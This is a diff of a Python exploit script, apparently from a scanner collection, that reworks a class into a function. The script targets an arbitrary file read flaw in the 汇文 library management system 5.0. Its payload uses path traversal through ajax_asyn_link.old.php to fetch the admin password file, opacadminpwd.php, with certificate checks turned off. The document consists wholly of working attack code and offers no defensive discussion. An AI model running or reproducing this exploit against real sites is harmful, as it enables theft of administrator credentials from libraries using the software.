@@ -9,17 +9,10 @@ description: 漏洞影响5.0版本,漏洞文件位于ajax_asyn_link.old.php中,�
 import sys
 import requests
 import warnings
-
-
-
-class ajax_asyn_link_old_fileread:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['汇文软件图书管理系统ajax_asyn_link.old.php任意文件读取','','']
         payload = "/zplug/ajax_asyn_link.old.php?url=../admin/opacadminpwd.php"
-        vulnurl = self.url + payload
+        vulnurl = url + payload
         try:
             req = requests.get(vulnurl, timeout=10, verify=False)
 
@@ -35,5 +28,5 @@ class ajax_asyn_link_old_fileread:
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = ajax_asyn_link_old_fileread(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+    
